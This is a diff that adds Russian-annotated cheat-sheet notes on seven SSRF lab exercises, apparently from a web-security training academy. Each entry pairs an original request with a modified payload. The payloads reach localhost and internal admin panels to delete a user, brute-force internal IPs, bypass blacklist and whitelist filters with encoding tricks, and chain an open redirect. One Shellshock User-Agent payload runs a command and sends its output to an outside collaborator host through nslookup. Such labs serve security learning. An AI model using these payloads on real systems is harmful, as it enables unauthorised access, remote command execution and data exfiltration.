@@ -1,0 +1,75 @@
+SSRF
+
+1. Basic SSRF against the local server
+ * Было (Original):
+   POST /product/stock HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+
+stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload для получения админки):
+   stockApi=http://localhost/admin
+
+ * Стало (Payload для удаления carlos):
+   stockApi=http://localhost/admin/delete?username=carlos
+
+2. Basic SSRF against another back-end system
+ * Было (Original):
+   POST /product/stock HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+
+stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload для брутфорса IP в Intruder):
+   stockApi=http://192.168.0.§1§:8080/admin
+
+ * Стало (Payload для удаления carlos, например IP оказался 192.168.0.183):
+   stockApi=http://192.168.0.183:8080/admin/delete?username=carlos
+
+3. Blind SSRF with out-of-band detection
+ * Было (Original):
+   GET /product?productId=1 HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: Mozilla/5.0 ...
+Referer: https://vulnerable-website.com/
+
+ * Стало (Payload):
+   Referer: http://YOUR-SUBDOMAIN.burpcollaborator.net
+
+4. SSRF with blacklist-based input filter
+ * Было (Original):
+   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload — замена 127.0.0.1 на 127.1 и двойной URL encode буквы a в admin -> %2561):
+   stockApi=http://127.1/%2561dmin/delete?username=carlos
+
+5. SSRF with filter bypass via open redirection vulnerability
+ * Было (Original):
+   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload — использование эндпоинта редиректа /product/nextProduct?path=...):
+   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+6. Blind SSRF with Shellshock exploitation
+ * Было (Original):
+   POST /product/stock HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
+
+stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload — меняются сразу два места: User-Agent и stockApi):
+   POST /product/stock HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: () { :;}; /bin/nslookup $(whoami).YOUR-SUBDOMAIN.burpcollaborator.net
+
+stockApi=http://192.168.0.X:8080/
+
+7. SSRF with whitelist-based input filter
+ * Было (Original):
+   stockApi=http://stock.welikeshop.net:8080/product/stock/check?productId=1&storeId=1
+
+ * Стало (Payload — обход через @ и двойное закодированное # -> %23):
+   stockApi=http://localhost%23@stock.welikeshop.net/admin/delete?username=carlos
